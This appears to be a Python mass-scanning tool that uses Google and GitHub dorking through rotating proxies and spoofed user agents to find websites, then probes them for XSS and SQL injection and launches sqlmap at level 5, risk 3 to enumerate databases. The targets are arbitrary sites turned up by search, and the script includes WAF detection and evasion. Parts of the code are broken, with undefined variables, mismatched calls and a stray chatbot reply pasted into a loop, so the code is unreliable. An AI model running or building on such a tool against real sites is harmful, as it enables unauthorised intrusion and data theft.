#/usr/bin/python3
import sys
from termcolor import colored, cprint
import terminal_banner
import random
import os
import requests
import glob
import time
import threading
import concurrent.futures
import itertools
from tqdm import tqdm
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from urllib.parse import parse_qs
import urllib.parse as urlparse
import subprocess
import logging
import re
import json
from datetime import datetime
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    print("Selenium and webdriver_manager modules not found. Please make sure they are installed.")
    sys.exit(1)

#########################################################################################
# Global variables
#########################################################################################

# Setup logging
today_date = datetime.now().strftime("%Y-%m-%d")
orig_stdout = sys.stderr
f = open(f'logs/{today_date}.log', 'w')
class Unbuffered:
    def __init__(self, stream):
       self.stream = stream
    
    def flush(self):
        pass

    def write(self, data):
       self.stream.write(data)
       self.stream.flush()
       f.write(data)    # Write the data of stdout here to a text file as well

sys.stderr = Unbuffered(sys.stderr)

# Default values for search parameters
DEFAULT_EXTENSION    = ""
DEFAULT_TOTAL_OUTPUT = 10
DEFAULT_PAGE_NO      = 1
LANG                 ="en"
RECURSIVE            = True

# TODO use target.txt and allow multiple domain
SUBDOMAIN            = None
ENCODING             = False

# GitHub Dorking
GITHUB_API_URL = 'https://api.github.com'
tokens_list = ['your_github_token']  # Add your GitHub tokens here
dorks_list = ['example_dork1', 'example_dork2']  # Add your dorks here
queries_list = ['example_query']  # Add your queries here
organizations_list = ['example_organization']  # Add your organizations here
users_list = ['example_user']  # Add your users here


# XSS Test Payload
XSS_TEST_PAYLOAD = "<script>alert('XSS')</script>"

# Constants for handling requests and delays
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 13729.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'
]


REQUEST_DELAY = 5  # Base delay between requests in seconds
# Initial delay and the factor by which the delay is multiplied
initial_delay = 10  # Start with a 10-second delay
delay_factor  = 2  # Double the delay each time
max_delay     = 600  # Maximum delay of 10 minutes

current_delay = initial_delay # TODO add backoff timer

# Define file paths
# Initialize locks for thread-safe file writing
# TODO make more modular
lock_git     = threading.Lock()
lock_sqli    = threading.Lock()
lock_xss     = threading.Lock()
lock_api     = threading.Lock()
lock_web     = threading.Lock()
lock_secret  = threading.Lock()
lock_dlphp   = threading.Lock()
lock_backup  = threading.Lock()

github_file_path = "reports/potential_github_sites.txt"

# TODO refactor
sqli_file_path    = "reports/potential_sqli_sites.txt"
xss_file_path     = "reports/potential_xss_sites.txt"
api_file_path     = "reports/potential_api_sites.txt"
web_file_path     = "reports/potential_web_sites.txt"
secret_file_path  = "reports/potential_secret_sites.txt"
dlphp_file_path   = "reports/potential_dlphp_sites.txt"
backup_file_path  = "reports/potential_backup_sites.txt"

vuln_sqli_file_path    = "reports/vulnerable_sqli_sites.txt"
vuln_xss_file_path     = "reports/vulnerable_xss_sites.txt"
vuln_api_file_path     = "reports/vulnerable_api_sites.txt"
vuln_web_file_path     = "reports/vulnerable_web_sites.txt"
vuln_secret_file_path  = "reports/vulnerable_secret_sites.txt"
vuln_dlphp_file_path   = "reports/vulnerable_dlphp_sites.txt"
vuln_backup_file_path  = "reports/vulnerable_backup_sites.txt"

os. system('clear')

#########################################################################################
# Animation
#########################################################################################

banner = ("""
                    
    ▄▄▄▄·       ▄• ▄▌ ▐ ▄ ▄▄▄▄▄ ▄· ▄▌·▄▄▄▄  ▄▄▄  ▪   ▌ ▐·▄▄▄ .
    ▐█ ▀█▪▪     █▪██▌•█▌▐█•██  ▐█▪██▌██▪ ██ ▀▄ █·██ ▪█·█▌▀▄.▀·
    ▐█▀▀█▄ ▄█▀▄ █▌▐█▌▐█▐▐▌ ▐█.▪▐█▌▐█▪▐█· ▐█▌▐▀▀▄ ▐█·▐█▐█•▐▀▀▪▄
    ██▄▪▐█▐█▌.▐▌▐█▄█▌██▐█▌ ▐█▌· ▐█▀·.██. ██ ▐█•█▌▐█▌ ███ ▐█▄▄▌
    ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ ▀▀ █▪ ▀▀▀   ▀ • ▀▀▀▀▀• .▀  ▀▀▀▀. ▀   ▀▀▀ 
            
                        Made with ❤️ 
            For the Community, By the Community   

            ###################################
                      Made by ElNiak
 linkedin  - https://www.linkedin.com/in/christophe-crochet-5318a8182/ 
             Github - https://github.com/elniak
                                                                                      
""")
banner_terminal = terminal_banner.Banner(banner)
cprint(banner_terminal , 'green', file=sys.stderr)

banner_res = ("""
   ___               ____
  / _ \___ ___ __ __/ / /____
 / , _/ -_|_-</ // / / __(_-<
/_/|_|\__/___/\_,_/_/\__/___/
*****************************
                                                                                      
""")
banner_terminal_res = terminal_banner.Banner(banner_res)

def load_animation():
        load_str = "Preparing the Dorking Pentesting...."
        ls_len = len(load_str)

        animation = "|/-\\"
        anicount = 0
        counttime = 0
        i = 0
        while (counttime != 100):
                time.sleep(0.075)
                load_str_list = list(load_str)
                x = ord(load_str_list[i])
                y = 0
                if x != 32 and x != 46:
                        if x>90:
                                y = x-32
                        else:
                                y = x + 32
                        load_str_list[i]= chr(y)

                res =''
                for j in range(ls_len):
                        res = res + load_str_list[j]

                sys.stdout.write("\r"+res + animation[anicount])
                sys.stdout.flush()

                load_str = res

                anicount = (anicount + 1)% 4
                i =(i + 1)% ls_len
                counttime = counttime + 1

        if os.name =="nt":
                os.system("cls")

        else:
                os.system("clear")
                
#########################################################################################
# Proxy related functions
#########################################################################################

# Round-robin proxy generator
def round_robin_proxies(proxies):
    return itertools.cycle(proxies)
    
# Function to check if a proxy is up
def is_proxy_alive(proxy):
    try:
        response = requests.get('http://www.google.com', proxies={"http": proxy, "https": proxy}, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False
    
# Load proxies from file
def load_proxies(file="proxies/free-proxy-list.txt"):
    with open(file, 'r') as file:
        return [line.strip() for line in file if line.strip()]
    
#########################################################################################
# File writing functions
#########################################################################################

# Thread-safe addition to results lists
def safe_add_result(result, 
                    websites_sqli=None, 
                    websites_xss=None,
                    websites_vuln=None, 
                    websites_api=None, 
                    websites_secret=None, 
                    websites_dlphp=None, 
                    websites_backup=None, 
                    github_websites=None):
    # TODO category not working, all go to xss
    category, urls = result
    if urls:
        cprint(f"Adding {len(urls)} URLs to {category} list...", 'blue', file=sys.stderr)
        for url in urls:
            if url:
                if "https://www.google.com/sorry/" not in url:
                    if "github.com" in url:
                        with lock_git:
                            with open(github_file_path, "a") as file:
                                file.write(url + "\n")
                            github_websites.add(url)
                    elif category == "sqli":
                        with lock_sqli:  # Ensure thread-safe write operation
                            with open(sqli_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_sqli.add(url)  # Optionally maintain the set
                    elif category == "xss":
                        with lock_xss:  # Ensure thread-safe write operation
                            with open(xss_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_xss.add(url)  # Optionally maintain the set
                    elif category == "web":
                        with lock_web:  # Ensure thread-safe write operation
                            with open(web_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_vuln.add(url)  # Optionally maintain the set
                    elif category == "api":
                        with lock_api:  # Ensure thread-safe write operation
                            with open(api_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_api.add(url)  # Optionally maintain the set
                    elif category == "secret":
                        with lock_secret:  # Ensure thread-safe write operation
                            with open(secret_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_secret.add(url)  # Optionally maintain the set
                    elif category == "download-php":
                        with lock_dlphp:  # Ensure thread-safe write operation
                            with open(dlphp_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_dlphp.add(url)  # Optionally maintain the set
                    elif category == "backup":
                        with lock_backup:  # Ensure thread-safe write operation
                            with open(backup_file_path, "a") as file:  # Open file in append mode
                                file.write(url + "\n")  # Write URL to file
                            websites_backup.add(url)  # Optionally maintain the set
   
#########################################################################################
# Google Dorking and searching functions
#########################################################################################

class SearchResult:
    def __init__(self, url, title, description):
        self.url = url
        self.title = title
        self.description = description

    def __repr__(self):
        return f"SearchResult(url={self.url}, title={self.title}, description={self.description})"


def param_converter(data, url=False):
    if 'str' in str(type(data)):
        if url:
            dictized = {}
            parts = data.split('/')[3:]
            for part in parts:
                dictized[part] = part
            return dictized
        else:
            return json.loads(data)
    else:
        if url:
            url = urlparse(url).scheme + '://' + urlparse(url).netloc
            for part in list(data.values()):
                url += '/' + part
            return url
        else:
            return json.dumps(data)
        
def start_request(proxies, advanced=False, waf=False, is_json=False, GET=False, url=None, 
                  data=None, headers=None, params=None, base_url=None, full_query=None, 
                  category=None, get_urls=True):
    urls = []
    try:
        if GET:
            cprint(f"Searching for GET: {full_query} ({category}) with proxy {proxy}...", 'yellow', file=sys.stderr)
            response = requests.get(base_url,data=data, headers=headers, 
                                    params=params, proxies=proxies, verify=False, timeout=10)
        elif is_json:
            cprint(f"Searching for POST + JSON: {full_query} ({category}) with proxy {proxy}...", 'yellow', file=sys.stderr)
            response = requests.post(url, json=data, headers=headers,
                                    timeout=10, verify=False,  proxies=proxies)
        else:
            cprint(f"Searching for POST: {full_query} ({category}) with proxy {proxy}...", 'yellow', file=sys.stderr)
            response = requests.post(url, data=data, headers=headers,
                                    timeout=10, verify=False, proxies=proxies)
        
        # Parse
        if get_urls:
            soup = BeautifulSoup(response.text, "html.parser")
            result_block = soup.find_all("div", attrs={"class": "g"})
            for result in result_block:
                # Find link, title, description
                link = result.find("a", href=True)
                title = result.find("h3")
                description_box = result.find(
                    "div", {"style": "-webkit-line-clamp:2"})
                if description_box:
                    description = description_box.text
                    if link and title and description:
                        if advanced:
                            urls.append(SearchResult(link["href"], title.text, description))
                        else:
                            urls.append(link["href"])
                        
        # Placeholder for URL extraction logic
        return urls  # Return the category and a placeholder result
    except requests.exceptions.ProtocolError:
        cprint('WAF is dropping suspicious requests.')
        cprint('Scanning will continue after 10 minutes.')
        time.sleep(600)
    except requests.exceptions.RequestException as e:
        # cprint(f"Error searching for {full_query} with proxy {proxy}: {e}", 'red', file=sys.stderr)
        time.sleep(2)  # Wait before retrying
    finally:
        return urls

# Proxy-aware Google search function
def google_search_with_proxy(dork_tuple, proxy, category, retries=3, advanced=False, waf=False):
    try:
        query, extension = dork_tuple
    except ValueError:
        query = dork_tuple
        extension = ""
    
    base_url = "https://www.google.com/search"
    headers = {
        'User-Agent': random.choice(USER_AGENTS)
    }
    proxies = {'http': proxy, 'https': proxy}
        
    # Incorporate subdomain into the search query if specified
    if SUBDOMAIN:
        full_query = f"site:{SUBDOMAIN} {query} {extension}".strip()
    else:
        full_query = f"{query} {extension}".strip()
    
    # TODO
    if "?" in query:
        # Threat data as path 
        is_json = False
        url = param_converter(data, url)
        data = []
        GET, POST = True, False
        params = {
            'q': full_query,
            "num": DEFAULT_TOTAL_OUTPUT + 2,  # Prevents multiple requests
            "hl": LANG,
        }
    else:
        # Threat data as JSON
        is_json = True
        headers['Content-type'] = 'application/json'
        data = param_converter(data)
        params = {}
    

    urls = []
    for _ in range(retries):
        # The code you provided is not valid Python code. It seems like you have written some comments
        # but there is no actual code present. If you have a specific question or need help with
        # Python code, please provide the code snippet so I can assist you better.
        urls = start_request(proxies=proxies, advanced=advanced, waf=waf, GET=GET, url=url, 
                             data=data, headers=headers, params=params, base_url=base_url, 
                             full_query=full_query, is_json=is_json, category=category)

    if urls:
        return category, urls
    return category, None  # Indicate failure after retries
                             
def load_google_dorks_and_search(extension=DEFAULT_EXTENSION, total_output=DEFAULT_TOTAL_OUTPUT, page_no=DEFAULT_PAGE_NO, proxies=None):
    dork_files    = glob.glob("dorks/google/*")
    proxy_cycle = round_robin_proxies(proxies)
    
    websites_sqli    = set()
    websites_xss     = set()
    websites_api     = set()
    websites_web     = set()
    websites_secret  = set()
    websites_dlphp   = set()
    websites_backup  = set()
    websites_git     = set()
    
    lock = threading.Lock()  # To ensure thread-safe operations on sets

    search_tasks = []

    search_tasks_sqli   = []
    search_tasks_xss    = []
    search_tasks_api    = []
    search_tasks_web    = []
    search_tasks_secret = []
    search_tasks_dlphp  = []
    search_tasks_backup = []

    for dork_file in dork_files:
        if "sql" in dork_file.lower():
            category = "sqli"
        elif "xss" in dork_file.lower():
            category = "xss"
        elif "api" in dork_file.lower():
            category = "api"
        elif "web" in dork_file.lower():
            category = "web"
        elif "secret" in dork_file.lower():
            category = "secret"
        elif "download-php" in dork_file.lower():
            category = "dlphp"
        elif "backup" in dork_file.lower():
            category = "backup"
        else:
            category = "other"
        with open(dork_file, 'r') as file:
            dorks = [(line.strip(), extension, category) for line in file if line.strip()]
        
        # Separate tasks by category before shuffling
        if category   == "sqli":
            search_tasks_sqli.extend(dorks)
        elif category == "xss":
            search_tasks_xss.extend(dorks)
        elif category == "api":
            search_tasks_api.extend(dorks)
        elif category == "web":
            search_tasks_web.extend(dorks)
        elif category == "secret":
            search_tasks_secret.extend(dorks)
        elif category == "dlphp":
            search_tasks_dlphp.extend(dorks)
        elif category == "backup":
            search_tasks_backup.extend(dorks)

    # Now shuffle the dorks within each category
    random.shuffle(search_tasks_sqli)
    random.shuffle(search_tasks_xss)
    random.shuffle(search_tasks_api)
    random.shuffle(search_tasks_web)
    random.shuffle(search_tasks_secret)
    random.shuffle(search_tasks_dlphp)
    random.shuffle(search_tasks_backup)

    # Combine the tasks back together, maintaining category grouping
    search_tasks = search_tasks_sqli + search_tasks_xss + search_tasks_api + search_tasks_web + search_tasks_secret + search_tasks_dlphp + search_tasks_backup
    cprint(f"Total number of dorks: {len(search_tasks)}", 'yellow', file=sys.stderr)
    search_tasks_with_proxy = []
    # Now, append a proxy to each task
    for task in search_tasks:
        dork, extension, category = task
        proxy = next(proxy_cycle)
        search_tasks_with_proxy.append((dork, proxy, category))
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_search = {
            executor.submit(google_search_with_proxy, task[0], task[1], task[2]): task for task in search_tasks_with_proxy
        }
        for future in tqdm(concurrent.futures.as_completed(future_to_search), total=len(future_to_search), desc="Searching for vulnerable website", unit="site"):
            result = future.result()
            if result:
                with lock:
                    safe_add_result(result, websites_sqli, websites_xss, websites_web, websites_api, websites_secret, websites_dlphp, websites_backup, websites_git)

    return proxies, list(websites_sqli), list(websites_xss), list(websites_api), list(websites_web), list(websites_secret), list(websites_dlphp), list(websites_backup), list(websites_git)


#########################################################################################
# WAF
#########################################################################################

# from https://github.com/s0md3v/XSStrike/blob/master/core/wafDetector.py
def waf_detector(proxies, url, params, headers, GET, delay, timeout):
    with open(sys.path[0] + 'waf_signatures.json', 'r') as file:
        wafSignatures = json.load(file)
    # a payload which is noisy enough to provoke the WAF
    noise = '<script>alert("XSS")</script>'
    params['xss'] = noise
    # Opens the noise injected payload
    response = start_request(proxies=proxies, url=url, params=params, headers=headers,GET=GET)
    page = response.text
    code = str(response.status_code)
    headers = str(response.headers)
    cprint('Waf Detector code: {}'.format(code))
    cprint('Waf Detector headers:', response.headers)

    if int(code) >= 400:
        bestMatch = [0, None]
        for wafName, wafSignature in wafSignatures.items():
            score = 0
            pageSign = wafSignature['page']
            codeSign = wafSignature['code']
            headersSign = wafSignature['headers']
            if pageSign:
                if re.search(pageSign, page, re.I):
                    score += 1
            if codeSign:
                if re.search(codeSign, code, re.I):
                    score += 0.5  # increase the overall score by a smaller amount because http codes aren't strong indicators
            if headersSign:
                if re.search(headersSign, headers, re.I):
                    score += 1
            # if the overall score of the waf is higher than the previous one
            if score > bestMatch[0]:
                del bestMatch[:]  # delete the previous one
                bestMatch.extend([score, wafName])  # and add this one
        if bestMatch[0] != 0:
            return bestMatch[1]
        else:
            return None
    else:
        return None



#########################################################################################
# Github Dorking and searching functions
#########################################################################################

# Token Round Robin for Sequential Requests
token_index = 0

def token_round_robin():
    global token_index
    token = tokens_list[token_index]
    token_index = (token_index + 1) % len(tokens_list)
    return token

# URL Encoding Function
def __urlencode(str):
    return str.replace(':', '%3A').replace('"', '%22').replace(' ', '+')

def rate_limit_handler(headers):
    if 'X-RateLimit-Reset' in headers:
        reset_time = datetime.fromtimestamp(int(headers['X-RateLimit-Reset']))
        wait_time = (reset_time - datetime.now()).total_seconds() + 10  # Adding 10 seconds buffer
        print(f"Rate limit hit. Waiting for {wait_time} seconds.")
        time.sleep(wait_time)
        
def get_rate_limit_status():
    headers = {"Authorization": f"token {token_round_robin()}"}
    response = requests.get(f"{GITHUB_API_URL}/rate_limit", headers=headers)
    if response.status_code == 200:
        rate_limit = response.json()['rate']
        print(f"Limit: {rate_limit['limit']}, Remaining: {rate_limit['remaining']}, Reset: {datetime.fromtimestamp(rate_limit['reset'])}")
    else:
        print("Failed to fetch rate limit status")
        
# TODO
def github_search_with_proxy(dork_tuple, proxy, category, retries=3, advanced=False):
    # TODO advanced search
    try:
        query, extension = dork_tuple
    except ValueError:
        query = dork_tuple
        extension = ""
    full_query = f"{query} {extension}".strip()
    base_url = f"{GITHUB_API_URL}/search/code?q=" + __urlencode(extension + " " + query)
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        "Authorization": f"token {token_round_robin()}"
    }
    proxies = {'http': proxy, 'https': proxy}
    urls = []
    for _ in range(retries):
        try:
            cprint(f"Searching for {full_query} ({category}) with proxy {proxy}...", 'yellow', file=sys.stderr)
            response = requests.get(base_url, headers=headers, params=params, proxies=proxies, timeout=10)
            
            # Parse
            soup = BeautifulSoup(response.text, "html.parser")
            result_block = soup.find_all("div", attrs={"class": "g"})
            for result in result_block:
                # Find link, title, description
                link = result.find("a", href=True)
                title = result.find("h3")
                description_box = result.find(
                    "div", {"style": "-webkit-line-clamp:2"})
                if description_box:
                    description = description_box.text
                    if link and title and description:
                        if advanced:
                            urls.append(SearchResult(link["href"], title.text, description))
                        else:
                            urls.append(link["href"])
                        
            # Placeholder for URL extraction logic
            return category, urls  # Return the category and a placeholder result
        except requests.exceptions.RequestException as e:
            # cprint(f"Error searching for {full_query} with proxy {proxy}: {e}", 'red', file=sys.stderr)
            time.sleep(2)  # Wait before retrying

    return category, None  # Indicate failure after retries

def load_github_dorks_and_search(extension=DEFAULT_EXTENSION, total_output=DEFAULT_TOTAL_OUTPUT, page_no=DEFAULT_PAGE_NO, proxies=None):
    pass

#########################################################################################
# XSS Vulnerability testing functions
#########################################################################################

# Function to check if a given URL has a query string
def has_query_string(url):
    return bool(urlparse.urlparse(url).query)

# Function to inject a payload into a given URL
def inject_payload(url, payload):
    if has_query_string(url):
        url_parts = list(urlparse.urlparse(url))
        query = dict(parse_qs(url_parts[4]))
        for key in query:
            query[key] = f"{query[key]}{payload}"
        url_parts[4] = urlparse.urlencode(query)
        url = urlparse.urlunparse(url_parts)
    else:
        url += f"{payload}"
    return url

# Load proxies from file
def load_xss_payload():
    payloads = {}
    for payload_file in glob.glob("payloads/xss/*"):
        # Extract the vulnerability type from the filename
        vuln_type = payload_file.split('/')[-1].replace('_xss_payload.txt', '')
        with open(payload_file, 'r') as file:
            # Assuming each file may contain multiple payloads, one per line
            payloads[vuln_type] = [line.strip() for line in file.readlines()]
    return payloads

def test_vulnerability_xss(websites,proxies):
    """
    Test a list of websites for XSS vulnerability using multithreading and proxies.
    """
    results = []

    s = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=s)
    
    XSS_TEST_PAYLOAD = load_xss_payload()
    for website in tqdm(websites, desc=f"Testing for XSS for {website}", unit="site"):
        url, _   = website
        for payload in XSS_TEST_PAYLOAD:
            WAF = waf_detector(
                url, {list(params.keys())[0]: xsschecker}, headers, GET, delay, timeout)
            if WAF:
                cprint(f'WAF detected <!>')
            else:
                cprint('WAF Status: Offline')
            
            payload_url = inject_payload(url, payload)
            
            if payload in requests.get(payload_url).text:
                cprint(f"[VULNERABLE] {payload_url}", "red", file=sys.stderr)
                results.append(payload_url)
            else:
                cprint(f"[NOT VULNERABLE] {payload_url}", "green", file=sys.stderr)
        if results:
            driver.execute_script("window.open('');")
            driver.switch_to.window(driver.window_handles[-1])
            for vulnerable_url in results:
                driver.get(vulnerable_url)
    return results

#########################################################################################
# SQLi Vulnerability testing functions
#########################################################################################

def run_sqlmap(url, proxy):
    """
    Run sqlmap on a single URL.
    :param url: The URL to test with sqlmap.
    """
    try:
        # Example command, customize it based on your needs
        command = [
            "sqlmap",
            "-u", url,
            "--proxy", proxy,
            "--batch",
            "--level", "5",  # Level of tests to perform (1-5)
            "--risk", "3",   # Risk of tests to perform (1-3)
            # Additional flags for a full analysis can be added here
            "--dbs",         # Enumerate DBMS databases
            "--threads", "10"  # Use 10 threads
            # "--all" can be used for a full scan, but be cautious as it is very intrusive
        ]
        # Add additional parameters as needed. '--batch' is used to run sqlmap without user inputs (non-interactive mode).
        
        # Running sqlmap
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Print or process the result
        print(f"Results for {url}:")
        print(result.stdout)
        with open(f"{url.replace('://', '_').replace('/', '_')}.txt", "w") as output_file:
            output_file.write(result.stdout)
        
        # Handling errors if any
        if result.stderr:
            print(f"Errors/Warnings for {url}:")
            print(result.stderr)
            
    except Exception as e:
        print(f"Error running sqlmap on {url}: {e}")
        
def test_sqli_with_proxy(url_proxy):
    """
    Test a single website for SQL injection vulnerability using a specified proxy.
    """
    url, proxy   = url_proxy
    proxies_dict = {"http": proxy, "https": proxy}
    
    init_char = ['\'', '"']
    
    vuln = None
    
    for char in init_char:
        test_url     = url + char # TODO test more payloads 
        try:
            # TODO add cookie support
            session = requests.Session()
            retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
            session.mount('http://', HTTPAdapter(max_retries=retries))
            session.mount('https://', HTTPAdapter(max_retries=retries))
            print(f"Testing {test_url} for SQLi with proxy {proxy}...")
            response = session.get(test_url, proxies=proxies_dict, timeout=15) # Test other methods
            if "SQL syntax" in response.text:
                print(f"{url} ===> Vulnerable ?")
                run_sqlmap(url)
                return url, True
            else:
                vuln = False
        except requests.RequestException as e:
            pass
        
    return url, vuln  # Error or can't determine

def test_vulnerability_sqli(websites,proxies):
    """
    Test a list of websites for SQL injection vulnerability using multithreading and proxies.
    """
    results = []
    
    # The code snippet provided is written in Python and performs the following tasks:
    
    proxy_cycle = round_robin_proxies(proxies)
        
    for website in tqdm(websites, desc="Testing for SQLi", unit="site"):
        proxy = next(proxy_cycle)
        url, result = test_sqli_with_proxy(website, proxy)
        if result is True:
            cprint(f"{url} ===> Vulnerable!", 'green', file=sys.stderr)
            results.append(url)
        elif result is False:
            cprint(f"{url} ===> Not Vulnerable", 'red', file=sys.stderr)
        else:
            cprint(f"{url} ===> Can not be Determined", 'blue', file=sys.stderr)
    
    return results
  
#########################################################################################
# Main function
#########################################################################################          

def get_user_input():
    """
    Collect user input for website extension, total output, and starting page number, with default values.
    """
    extension    = input(colored(f"Please specify the website extension(eg- .in,.com,.pk) [default: {DEFAULT_EXTENSION}] -----> ", 'cyan')) or DEFAULT_EXTENSION
    subdomain    = input(colored(f"Do you want to restrict search to subdomain present in target.txt ? [default: true (vs false)] -----> ", 'cyan')) or "true"
    total_output = input(colored(f"Please specify the total no. of websites you want [default: {DEFAULT_TOTAL_OUTPUT}] ----> ", 'cyan')) or DEFAULT_TOTAL_OUTPUT
    page_no      = input(colored(f"From which Google page you want to start(eg- 1,2,3) [default: {DEFAULT_PAGE_NO}] ----> ", 'cyan')) or DEFAULT_PAGE_NO
    
    do_dorking_google   = input(colored(f"Do you want to do the Google dorking scan phase ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    do_dorking_github   = input(colored(f"Do you want to do the Github dorking scan phase ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    
    do_xss           = input(colored(f"Do you want to test for XSS vulnerability ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    do_encode_xss    = input(colored(f"Do you want to encode XSS payload ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    do_fuzzing_xss   = input(colored(f"Do you want to fuzz XSS payload ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    do_blind_xss     = input(colored(f"Do you want to test blind XSS payload ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    
    do_sqli         = input(colored(f"Do you want to test for SQLi vulnerability ? [default: true (vs false)] ----> ", 'cyan')) or "true"
    
    # Ensure numeric inputs are correctly converted to integers
    total_output = int(total_output)
    page_no      = int(page_no)
    do_dorking_google   = True if do_dorking_google.lower() == "true" else False
    do_dorking_github   = True if do_dorking_github.lower() == "true" else False
    subdomain           = True if subdomain.lower() == "true" else False
    if subdomain:
        # TODO allow multiple subdomains
        with open("target.txt", "r") as file:
            subdomain = file.read().strip()
        SUBDOMAIN = subdomain
    
    cprint(f"Extension: {extension}, Total Output: {total_output}, Page No: {page_no}, Do Google Dorking: {do_dorking_google}, Do Github Dorking {do_dorking_github}", 'green', file=sys.stderr)
    
    return extension, subdomain, total_output, page_no, do_dorking_google, do_dorking_github

if __name__ == "__main__":
    try:
        load_animation()
        if len(sys.argv) > 3:
            extension    = sys.argv[1]
            subdomain    = sys.argv[2]
            total_output = int(sys.argv[3])
            page_no      = int(sys.argv[4])
            do_dorking_google   = bool(sys.argv[5])
            do_dorking_github   = bool(sys.argv[6])
        else:
            extension, subdomain, total_output, page_no, do_dorking_google, do_dorking_github = get_user_input()
            
        proxies = load_proxies()
        proxies_cp = proxies.copy()
        dead_proxies  = 0
        total_proxies = len(proxies) 
        # TODO init website lists from file
        for proxy in tqdm(proxies_cp, desc="Checking proxies", unit="proxy"):
            if not is_proxy_alive(proxy):
                dead_proxies += 1
                cprint(f"Removing dead proxy {proxy}, dead proxies {dead_proxies}/{total_proxies}", 'red', file=sys.stderr)
                proxies.remove(proxy)
        logging.info(f"Up proxies: {len(proxies)}")
        
        if do_dorking_google:
            cprint("\nStarting Google dorking scan phase...\n", 'yellow', file=sys.stderr)
            proxies, website_list_sqli,  website_list_xss, _, _, _, _, _ = load_google_dorks_and_search(extension, total_output, page_no, proxies)
            
        if do_dorking_github:
            cprint("\nStarting Github dorking scan phase...\n", 'yellow', file=sys.stderr)
            # proxies, _, _, _, _, _, _, _, website_list_git = load_github_dorks_and_search(extension, total_output, page_no, proxies)
            
        
        vuln_sqli = []
        vuln_xss  = []    
        
        def read_potential_sites():
            vuln_sqli = set()
            vuln_xss = set()
            # Read potential SQLi sites from file
            with open(sqli_file_path, 'r') as sqli_file:
                vuln_sqli = sqli_file.read().splitlines()
            
            # Read potential XSS sites from file
            with open(xss_file_path, 'r') as xss_file:
                vuln_xss = xss_file.read().splitlines()
            
            # TODO: Read potential API, web, secret, dlphp, backup sites from their respective files
            
            return list(vuln_sqli), list(vuln_xss)

